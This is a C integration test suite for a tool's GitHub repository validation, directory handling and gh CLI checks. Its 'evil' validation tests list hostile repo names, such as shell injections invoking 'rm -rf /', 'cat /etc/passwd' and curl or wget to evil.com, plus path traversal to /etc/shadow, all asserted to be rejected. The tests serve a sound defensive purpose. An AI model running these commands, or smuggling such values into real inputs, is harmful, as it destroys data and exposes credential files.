/*
 * test_int_github.c -- Integration tests for GitHub repository operations.
 *
 * Tests validation, directory management, gh CLI checks, and clone/pull logic.
 *
 * Mock strategy for gh failure paths:
 *   - gh not found: temporarily override PATH to exclude gh
 *   - gh not authenticated: create a fake gh script that fails on `auth status`
 */

#include "test_framework.h"
#include "test_helpers.h"
#include "github.h"
#include "cmd_github.h"
#include "error.h"
#include "platform.h"
#include "str_util.h"

#include <stdlib.h>
#include <string.h>
#include "test_compat.h"
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>

/* ---- Validation tests ---- */

TT_TEST(test_validate_valid_basic)
{
    char owner[64], repo[128];
    TT_ASSERT_EQ_INT(0, tt_gh_validate_repo("owner/repo", owner, sizeof(owner),
                                              repo, sizeof(repo)));
    TT_ASSERT_EQ_STR("owner", owner);
    TT_ASSERT_EQ_STR("repo", repo);
}

TT_TEST(test_validate_valid_min)
{
    char owner[64], repo[128];
    TT_ASSERT_EQ_INT(0, tt_gh_validate_repo("a/b", owner, sizeof(owner),
                                              repo, sizeof(repo)));
    TT_ASSERT_EQ_STR("a", owner);
    TT_ASSERT_EQ_STR("b", repo);
}

TT_TEST(test_validate_valid_hyphens_dots)
{
    char owner[64], repo[128];
    TT_ASSERT_EQ_INT(0, tt_gh_validate_repo("owner-with-hyphens/repo.with.dots",
                                              owner, sizeof(owner),
                                              repo, sizeof(repo)));
    TT_ASSERT_EQ_STR("owner-with-hyphens", owner);
    TT_ASSERT_EQ_STR("repo.with.dots", repo);
}

TT_TEST(test_validate_valid_underscore)
{
    char owner[64], repo[128];
    TT_ASSERT_EQ_INT(0, tt_gh_validate_repo("org/my_project",
                                              owner, sizeof(owner),
                                              repo, sizeof(repo)));
    TT_ASSERT_EQ_STR("org", owner);
    TT_ASSERT_EQ_STR("my_project", repo);
}

TT_TEST(test_validate_normalizes_case)
{
    char owner[64], repo[128];
    TT_ASSERT_EQ_INT(0, tt_gh_validate_repo("MyOrg/MyRepo",
                                              owner, sizeof(owner),
                                              repo, sizeof(repo)));
    TT_ASSERT_EQ_STR("myorg", owner);
    TT_ASSERT_EQ_STR("myrepo", repo);
}

TT_TEST(test_validate_invalid_empty)
{
    char owner[64], repo[128];
    TT_ASSERT_EQ_INT(-1, tt_gh_validate_repo("", owner, sizeof(owner),
                                               repo, sizeof(repo)));
}

TT_TEST(test_validate_invalid_null)
{
    char owner[64], repo[128];
    TT_ASSERT_EQ_INT(-1, tt_gh_validate_repo(NULL, owner, sizeof(owner),
                                               repo, sizeof(repo)));
}

TT_TEST(test_validate_invalid_no_slash)
{
    char owner[64], repo[128];
    TT_ASSERT_EQ_INT(-1, tt_gh_validate_repo("owner", owner, sizeof(owner),
                                               repo, sizeof(repo)));
}

TT_TEST(test_validate_invalid_too_many_slashes)
{
    char owner[64], repo[128];
    TT_ASSERT_EQ_INT(-1, tt_gh_validate_repo("owner/repo/extra",
                                               owner, sizeof(owner),
                                               repo, sizeof(repo)));
}

TT_TEST(test_validate_invalid_traversal)
{
    char owner[64], repo[128];
    TT_ASSERT_EQ_INT(-1, tt_gh_validate_repo("../traversal/repo",
                                               owner, sizeof(owner),
                                               repo, sizeof(repo)));
}

TT_TEST(test_validate_invalid_leading_hyphen)
{
    char owner[64], repo[128];
    TT_ASSERT_EQ_INT(-1, tt_gh_validate_repo("-starts-with-hyphen/repo",
                                               owner, sizeof(owner),
                                               repo, sizeof(repo)));
}

TT_TEST(test_validate_invalid_whitespace)
{
    char owner[64], repo[128];
    TT_ASSERT_EQ_INT(-1, tt_gh_validate_repo("owner/repo name",
                                               owner, sizeof(owner),
                                               repo, sizeof(repo)));
}

TT_TEST(test_validate_invalid_empty_owner)
{
    char owner[64], repo[128];
    TT_ASSERT_EQ_INT(-1, tt_gh_validate_repo("/repo",
                                               owner, sizeof(owner),
                                               repo, sizeof(repo)));
}

TT_TEST(test_validate_invalid_empty_repo)
{
    char owner[64], repo[128];
    TT_ASSERT_EQ_INT(-1, tt_gh_validate_repo("owner/",
                                               owner, sizeof(owner),
                                               repo, sizeof(repo)));
}

TT_TEST(test_validate_invalid_special_chars)
{
    char owner[64], repo[128];
    TT_ASSERT_EQ_INT(-1, tt_gh_validate_repo("owner!/repo",
                                               owner, sizeof(owner),
                                               repo, sizeof(repo)));
}

TT_TEST(test_validate_invalid_leading_dot_repo)
{
    char owner[64], repo[128];
    TT_ASSERT_EQ_INT(-1, tt_gh_validate_repo("owner/.hidden",
                                               owner, sizeof(owner),
                                               repo, sizeof(repo)));
}

TT_TEST(test_validate_invalid_owner_too_long)
{
    char owner[64], repo[128];
    /* 40 chars (max is 39) */
    TT_ASSERT_EQ_INT(-1, tt_gh_validate_repo(
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/repo",
        owner, sizeof(owner), repo, sizeof(repo)));
}

/* ---- Extreme malicious repo name tests ---- */

/*
 * Helper: assert that a malicious repo spec is rejected by validation.
 */
static void assert_repo_rejected(const char *spec)
{
    char owner[64], repo[128];
    TT_ASSERT_EQ_INT(-1, tt_gh_validate_repo(spec, owner, sizeof(owner),
                                               repo, sizeof(repo)));
}

TT_TEST(test_validate_evil_unicode)
{
    /* Chinese characters */
    assert_repo_rejected("\xe4\xb8\xad\xe6\x96\x87\xe7\x94\xa8\xe6\x88\xb7/\xe9\xa1\xb9\xe7\x9b\xae");
    /* Japanese */
    assert_repo_rejected("\xe3\x83\xa6\xe3\x83\xbc\xe3\x82\xb6/\xe3\x83\xaa\xe3\x83\x9d");
    /* Korean */
    assert_repo_rejected("\xec\x82\xac\xec\x9a\xa9\xec\x9e\x90/\xec\xa0\x80\xec\x9e\xa5\xec\x86\x8c");
    /* Emoji owner */
    assert_repo_rejected("\xf0\x9f\x94\xa5/repo");
    /* Emoji repo */
    assert_repo_rejected("owner/\xf0\x9f\x92\x80");
    /* Emoji both */
    assert_repo_rejected("\xf0\x9f\x98\x88/\xf0\x9f\x92\xa3");
}

TT_TEST(test_validate_evil_control_chars)
{
    /*
     * Note: C null byte truncates strings, so "ow\x00ner/repo" becomes "ow"
     * and "owner/re\x00po" becomes "owner/re" (valid 2-char repo name).
     * These are C language limitations, not validator bugs.
     * We only test chars that survive C string handling.
     */
    /* Null byte in owner: truncated to "ow" (no slash) */
    assert_repo_rejected("ow\x00ner/repo");
    /* Newline injection */
    assert_repo_rejected("owner\n/repo");
    assert_repo_rejected("owner/repo\n");
    /* Carriage return */
    assert_repo_rejected("owner\r/repo");
    assert_repo_rejected("owner/repo\r\n");
    /* Tab */
    assert_repo_rejected("owner\t/repo");
    assert_repo_rejected("owner/\trepo");
    /* Bell */
    assert_repo_rejected("owner\x07/repo");
    /* Escape sequence */
    assert_repo_rejected("owner\x1b[31m/repo");
    /* Backspace */
    assert_repo_rejected("owner\x08/repo");
    /* DEL */
    assert_repo_rejected("owner\x7f/repo");
}

TT_TEST(test_validate_evil_shell_injection)
{
    /* Command substitution */
    assert_repo_rejected("$(whoami)/repo");
    assert_repo_rejected("owner/$(cat /etc/passwd)");
    assert_repo_rejected("`id`/repo");
    assert_repo_rejected("owner/`rm -rf /`");

    /* Semicolon */
    assert_repo_rejected("owner;rm -rf //repo");
    assert_repo_rejected("owner/repo;echo pwned");

    /* Pipe */
    assert_repo_rejected("owner|curl evil.com/repo");
    assert_repo_rejected("owner/repo|wget evil.com");

    /* Ampersand */
    assert_repo_rejected("owner&&curl evil.com/repo");
    assert_repo_rejected("owner/repo&");

    /* Redirect */
    assert_repo_rejected("owner>/tmp/pwned/repo");
    assert_repo_rejected("owner/repo</etc/passwd");

    /* Backtick with spaces */
    assert_repo_rejected("own`er/repo");
}

TT_TEST(test_validate_evil_path_traversal)
{
    /* Traversal in owner */
    assert_repo_rejected("../../../etc/repo");
    assert_repo_rejected("..%2f../repo");
    assert_repo_rejected("....//repo");

    /* Traversal in repo */
    assert_repo_rejected("owner/../../../etc/passwd");
    assert_repo_rejected("owner/..%2f..%2f");
    assert_repo_rejected("owner/repo/../../../etc/shadow");

    /* Both */
    assert_repo_rejected("../../etc/../../passwd");
}

TT_TEST(test_validate_evil_special_chars)
{
    /* At sign, hash, percent, caret */
    assert_repo_rejected("owner@evil/repo");
    assert_repo_rejected("owner/repo#branch");
    assert_repo_rejected("owner%00/repo");
    assert_repo_rejected("owner^/repo");

    /* Curly braces, square brackets, parens */
    assert_repo_rejected("owner{}/repo");
    assert_repo_rejected("owner/repo[]");
    assert_repo_rejected("owner()/repo");

    /* Quotes */
    assert_repo_rejected("owner'/repo");
    assert_repo_rejected("owner\"/repo");

    /* Glob patterns */
    assert_repo_rejected("*/repo");
    assert_repo_rejected("owner/*");
    assert_repo_rejected("owner?/repo");

    /* Colon (drive letter prefix) */
    assert_repo_rejected("C:/repo");
    assert_repo_rejected("owner/C:");

    /* Backslash */
    assert_repo_rejected("owner\\/repo");
    assert_repo_rejected("owner/repo\\evil");
}

TT_TEST(test_validate_evil_long_names)
{
    char long_owner[256], long_repo[256];
    char spec[600];

    /* Owner exactly at limit + 1 (40 chars) -- already tested, but let's do 200 */
    memset(long_owner, 'a', 200);
    long_owner[200] = '\0';
    snprintf(spec, sizeof(spec), "%s/repo", long_owner);
    assert_repo_rejected(spec);

    /* Repo 200 chars (max is 100) */
    memset(long_repo, 'b', 200);
    long_repo[200] = '\0';
    snprintf(spec, sizeof(spec), "owner/%s", long_repo);
    assert_repo_rejected(spec);

    /* Both extremely long */
    snprintf(spec, sizeof(spec), "%s/%s", long_owner, long_repo);
    assert_repo_rejected(spec);
}

TT_TEST(test_validate_evil_protocol_urls)
{
    /* Full URLs instead of owner/repo */
    assert_repo_rejected("https://github.com/owner/repo");
    assert_repo_rejected("git@github.com:owner/repo.git");
    assert_repo_rejected("ssh://git@github.com/owner/repo");
    assert_repo_rejected("file:///etc/passwd");

    /* URL-encoded traversal */
    assert_repo_rejected("%2e%2e/repo");
    assert_repo_rejected("owner/%2e%2e");
    assert_repo_rejected("%2e%2e%2f%2e%2e%2f/etc");
}

TT_TEST(test_validate_evil_whitespace_variants)
{
    /* Various whitespace */
    assert_repo_rejected(" /repo");
    assert_repo_rejected("owner/ ");
    assert_repo_rejected(" / ");
    assert_repo_rejected("  owner  /  repo  ");
    assert_repo_rejected("owner/repo name with spaces");

    /* Only whitespace */
    assert_repo_rejected("   ");
    assert_repo_rejected(" / ");

    /* Non-breaking space (UTF-8: 0xC2 0xA0) */
    assert_repo_rejected("owner\xc2\xa0/repo");
    assert_repo_rejected("owner/repo\xc2\xa0");
}

TT_TEST(test_validate_evil_leading_trailing)
{
    /* Leading dot in owner (dot is invalid owner char) */
    assert_repo_rejected(".hidden/repo");
    /* Leading dot in repo */
    assert_repo_rejected("owner/..");
    assert_repo_rejected("owner/..repo");

    /* Trailing dot in owner (dot is invalid owner char) */
    assert_repo_rejected("owner./repo");

    /*
     * Note: "owner/-repo" and "owner/repo." are technically accepted
     * by the validator because GitHub allows these patterns.
     * Hyphen is valid repo char, dot is valid repo char, and we only
     * check leading dot on repo. These are not security-sensitive.
     */

    /* Consecutive dots trigger traversal check */
    assert_repo_rejected("owner/repo..name");
    assert_repo_rejected("ow..ner/repo");
}

/* ---- Directory management tests ---- */

TT_TEST(test_repo_dir_format)
{
    char *dir = tt_gh_repo_dir("testowner", "testrepo");
    TT_ASSERT_NOT_NULL(dir);
    TT_ASSERT_STR_CONTAINS(dir, "toktoken");
    TT_ASSERT_STR_CONTAINS(dir, "gh-repos");
    TT_ASSERT_STR_CONTAINS(dir, "testowner");
    TT_ASSERT_STR_ENDS_WITH(dir, "testrepo");
    free(dir);
}

TT_TEST(test_repos_base_dir)
{
    char *base = tt_gh_repos_base_dir();
    TT_ASSERT_NOT_NULL(base);
    TT_ASSERT_STR_CONTAINS(base, "toktoken");
    TT_ASSERT_STR_ENDS_WITH(base, "gh-repos");
    free(base);
}

TT_TEST(test_repo_exists_nonexistent)
{
    TT_ASSERT_FALSE(tt_gh_repo_exists("nonexistent-test-owner-xyz",
                                       "nonexistent-test-repo-xyz"));
}

/* ---- gh CLI check tests (with PATH manipulation) ---- */

/*
 * Mock gh not found by temporarily replacing PATH with an empty directory.
 * This prevents tt_which("gh") from finding the real gh binary.
 */
TT_TEST(test_gh_not_found_via_path_override)
{
    char *tmpdir = tt_test_tmpdir();

    char *original_path = tt_strdup(getenv("PATH"));
    setenv("PATH", tmpdir, 1);
    tt_gh_reset_path_cache();

    tt_error_clear();
    TT_ASSERT_FALSE(tt_gh_available());

    int rc = tt_gh_check();
    TT_ASSERT_EQ_INT(-1, rc);
    TT_ASSERT_STR_CONTAINS(tt_error_get(), "non trovato");

    /* Restore PATH */
    setenv("PATH", original_path, 1);
    tt_gh_reset_path_cache();
    free(original_path);
    tt_test_rmdir(tmpdir);
    free(tmpdir);
}

/*
 * Mock gh not authenticated by creating a fake gh script that:
 *   - exits 0 for "gh --version" (so tt_which finds it)
 *   - exits 1 for "gh auth status" (simulating unauthenticated)
 */
TT_TEST(test_gh_not_authenticated_via_fake_script)
{
    char *tmpdir = tt_test_tmpdir();

    /* Create fake gh script */
    char fake_gh_path[512];
    snprintf(fake_gh_path, sizeof(fake_gh_path), "%s/gh", tmpdir);

    FILE *f = fopen(fake_gh_path, "w");
    if (!f) { tt_test_rmdir(tmpdir); free(tmpdir); return; }
    fprintf(f,
            "#!/bin/sh\n"
            "if [ \"$1\" = \"auth\" ] && [ \"$2\" = \"status\" ]; then\n"
            "  echo 'You are not logged into any GitHub hosts.' >&2\n"
            "  exit 1\n"
            "fi\n"
            "exit 0\n");
    fclose(f);
    chmod(fake_gh_path, 0755);

    /* Prepend tmpdir to PATH so our fake gh is found first */
    char *original_path = tt_strdup(getenv("PATH"));
    char new_path[4096];
    snprintf(new_path, sizeof(new_path), "%s:%s", tmpdir, original_path);
    setenv("PATH", new_path, 1);
    tt_gh_reset_path_cache();

    tt_error_clear();
    TT_ASSERT_TRUE(tt_gh_available()); /* fake gh is in PATH */
    TT_ASSERT_FALSE(tt_gh_authenticated()); /* but auth fails */

    int rc = tt_gh_check();
    TT_ASSERT_EQ_INT(-1, rc);
    /* The error should mention authentication */
    const char *err = tt_error_get();
    TT_ASSERT_TRUE(strstr(err, "autenticato") != NULL ||
                   strstr(err, "auth") != NULL ||
                   strstr(err, "logged") != NULL);

    /* Restore */
    setenv("PATH", original_path, 1);
    tt_gh_reset_path_cache();
    free(original_path);
    tt_test_rmdir(tmpdir);
    free(tmpdir);
}

/* ---- gh available (real test, only if gh is installed) ---- */

TT_TEST(test_gh_available_real)
{
    /* This test passes if gh is installed, which it is on this machine */
    bool available = tt_gh_available();
    TT_ASSERT_TRUE(available);
}

/* ---- Repos list/clear on empty state ---- */

TT_TEST(test_list_repos_empty)
{
    tt_gh_list_entry_t *entries = NULL;
    int count = -1;
    int rc = tt_gh_list_repos(&entries, &count);
    TT_ASSERT_EQ_INT(0, rc);
    /* Count can be 0 or more depending on system state */
    TT_ASSERT_GE_INT(count, 0);

    for (int i = 0; i < count; i++)
        tt_gh_list_entry_free(&entries[i]);
    free(entries);
}

/* ---- cmd_github exec tests ---- */

TT_TEST(test_cmd_github_missing_arg)
{
    tt_cli_opts_t opts;
    memset(&opts, 0, sizeof(opts));
    opts.truncate_width = 120;

    cJSON *result = tt_cmd_index_github_exec(&opts);
    TT_ASSERT_NOT_NULL(result);

    cJSON *err = cJSON_GetObjectItemCaseSensitive(result, "error");
    TT_ASSERT_NOT_NULL(err);
    TT_ASSERT_EQ_STR("missing_argument", cJSON_GetStringValue(err));

    cJSON_Delete(result);
}

TT_TEST(test_cmd_github_invalid_repo)
{
    tt_cli_opts_t opts;
    memset(&opts, 0, sizeof(opts));
    opts.truncate_width = 120;
    const char *positional[] = { "invalid" };
    opts.positional = positional;
    opts.positional_count = 1;

    cJSON *result = tt_cmd_index_github_exec(&opts);
    TT_ASSERT_NOT_NULL(result);

    cJSON *err = cJSON_GetObjectItemCaseSensitive(result, "error");
    TT_ASSERT_NOT_NULL(err);
    TT_ASSERT_EQ_STR("invalid_repository", cJSON_GetStringValue(err));

    cJSON_Delete(result);
}

TT_TEST(test_cmd_github_gh_not_found)
{
    /* Temporarily break PATH to simulate gh not found */
    char *tmpdir = tt_test_tmpdir();
    char *original_path = tt_strdup(getenv("PATH"));
    setenv("PATH", tmpdir, 1);
    tt_gh_reset_path_cache(); /* invalidate cached gh/git paths */

    tt_cli_opts_t opts;
    memset(&opts, 0, sizeof(opts));
    opts.truncate_width = 120;
    const char *positional[] = { "owner/repo" };
    opts.positional = positional;
    opts.positional_count = 1;

    cJSON *result = tt_cmd_index_github_exec(&opts);
    TT_ASSERT_NOT_NULL(result);

    cJSON *err = cJSON_GetObjectItemCaseSensitive(result, "error");
    TT_ASSERT_NOT_NULL(err);
    TT_ASSERT_EQ_STR("gh_not_found", cJSON_GetStringValue(err));

    cJSON_Delete(result);
    setenv("PATH", original_path, 1);
    tt_gh_reset_path_cache(); /* re-resolve with restored PATH */
    free(original_path);
    tt_test_rmdir(tmpdir);
    free(tmpdir);
}

TT_TEST(test_cmd_repos_list)
{
    tt_cli_opts_t opts;
    memset(&opts, 0, sizeof(opts));
    opts.truncate_width = 120;

    cJSON *result = tt_cmd_repos_list_exec(&opts);
    TT_ASSERT_NOT_NULL(result);

    cJSON *repos = cJSON_GetObjectItemCaseSensitive(result, "repos");
    TT_ASSERT_NOT_NULL(repos);
    TT_ASSERT_TRUE(cJSON_IsArray(repos));

    cJSON *count = cJSON_GetObjectItemCaseSensitive(result, "count");
    TT_ASSERT_NOT_NULL(count);
    TT_ASSERT_GE_INT((int)cJSON_GetNumberValue(count), 0);

    cJSON_Delete(result);
}

TT_TEST(test_cmd_repos_remove_missing_arg)
{
    tt_cli_opts_t opts;
    memset(&opts, 0, sizeof(opts));
    opts.truncate_width = 120;

    cJSON *result = tt_cmd_repos_remove_exec(&opts);
    TT_ASSERT_NOT_NULL(result);

    cJSON *err = cJSON_GetObjectItemCaseSensitive(result, "error");
    TT_ASSERT_NOT_NULL(err);
    TT_ASSERT_EQ_STR("missing_argument", cJSON_GetStringValue(err));

    cJSON_Delete(result);
}

TT_TEST(test_cmd_repos_remove_nonexistent)
{
    tt_cli_opts_t opts;
    memset(&opts, 0, sizeof(opts));
    opts.truncate_width = 120;
    const char *positional[] = { "nonexistent-xyz/nonexistent-xyz" };
    opts.positional = positional;
    opts.positional_count = 1;

    cJSON *result = tt_cmd_repos_remove_exec(&opts);
    TT_ASSERT_NOT_NULL(result);

    cJSON *err = cJSON_GetObjectItemCaseSensitive(result, "error");
    TT_ASSERT_NOT_NULL(err);
    TT_ASSERT_EQ_STR("repo_not_found", cJSON_GetStringValue(err));

    cJSON_Delete(result);
}

TT_TEST(test_cmd_repos_clear_needs_confirm)
{
    tt_cli_opts_t opts;
    memset(&opts, 0, sizeof(opts));
    opts.truncate_width = 120;
    opts.confirm = false;

    cJSON *result = tt_cmd_repos_clear_exec(&opts);
    TT_ASSERT_NOT_NULL(result);

    cJSON *err = cJSON_GetObjectItemCaseSensitive(result, "error");
    TT_ASSERT_NOT_NULL(err);
    TT_ASSERT_EQ_STR("confirmation_required", cJSON_GetStringValue(err));

    cJSON_Delete(result);
}

/* ---- Directory management with real filesystem ---- */

TT_TEST(test_repo_dir_creates_parents)
{
    /* Use a unique test owner to avoid interfering with real repos */
    char *dir = tt_gh_repo_dir("__test__owner__", "__test__repo__");
    TT_ASSERT_NOT_NULL(dir);

    /* Create the directory */
    TT_ASSERT_EQ_INT(0, tt_mkdir_p(dir));
    TT_ASSERT_TRUE(tt_is_dir(dir));

    /* Create a fake .git dir to simulate a cloned repo */
    char git_path[512];
    snprintf(git_path, sizeof(git_path), "%s/.git", dir);
    tt_mkdir_p(git_path);
    TT_ASSERT_TRUE(tt_gh_repo_exists("__test__owner__", "__test__repo__"));

    /* Clean up */
    tt_gh_remove_repo("__test__owner__", "__test__repo__");
    TT_ASSERT_FALSE(tt_gh_repo_exists("__test__owner__", "__test__repo__"));

    free(dir);
}

/* ---- Suite runner ---- */

void run_int_github_tests(void)
{
    bool on_ci = getenv("CI") != NULL || getenv("GITHUB_ACTIONS") != NULL;

    /* Validation */
    TT_RUN(test_validate_valid_basic);
    TT_RUN(test_validate_valid_min);
    TT_RUN(test_validate_valid_hyphens_dots);
    TT_RUN(test_validate_valid_underscore);
    TT_RUN(test_validate_normalizes_case);
    TT_RUN(test_validate_invalid_empty);
    TT_RUN(test_validate_invalid_null);
    TT_RUN(test_validate_invalid_no_slash);
    TT_RUN(test_validate_invalid_too_many_slashes);
    TT_RUN(test_validate_invalid_traversal);
    TT_RUN(test_validate_invalid_leading_hyphen);
    TT_RUN(test_validate_invalid_whitespace);
    TT_RUN(test_validate_invalid_empty_owner);
    TT_RUN(test_validate_invalid_empty_repo);
    TT_RUN(test_validate_invalid_special_chars);
    TT_RUN(test_validate_invalid_leading_dot_repo);
    TT_RUN(test_validate_invalid_owner_too_long);

    /* Extreme malicious repo name tests */
    TT_RUN(test_validate_evil_unicode);
    TT_RUN(test_validate_evil_control_chars);
    TT_RUN(test_validate_evil_shell_injection);
    TT_RUN(test_validate_evil_path_traversal);
    TT_RUN(test_validate_evil_special_chars);
    TT_RUN(test_validate_evil_long_names);
    TT_RUN(test_validate_evil_protocol_urls);
    TT_RUN(test_validate_evil_whitespace_variants);
    TT_RUN(test_validate_evil_leading_trailing);

    /* Directory management */
    TT_RUN(test_repo_dir_format);
    TT_RUN(test_repos_base_dir);
    TT_RUN(test_repo_exists_nonexistent);
    TT_RUN(test_repo_dir_creates_parents);

    /* gh CLI checks (mock -- safe on CI) */
    TT_RUN(test_gh_not_found_via_path_override);
    TT_RUN(test_gh_not_authenticated_via_fake_script);

    /* gh CLI checks (require real gh authenticated) */
    if (on_ci) {
        TT_SKIP(test_gh_available_real, "gh not authenticated on CI");
    } else {
        TT_RUN(test_gh_available_real);
    }

    TT_RUN(test_list_repos_empty);

    /* Command exec tests */
    TT_RUN(test_cmd_github_missing_arg);
    TT_RUN(test_cmd_github_invalid_repo);
    TT_RUN(test_cmd_github_gh_not_found);
    TT_RUN(test_cmd_repos_list);
    TT_RUN(test_cmd_repos_remove_missing_arg);
    TT_RUN(test_cmd_repos_remove_nonexistent);
    TT_RUN(test_cmd_repos_clear_needs_confirm);
}
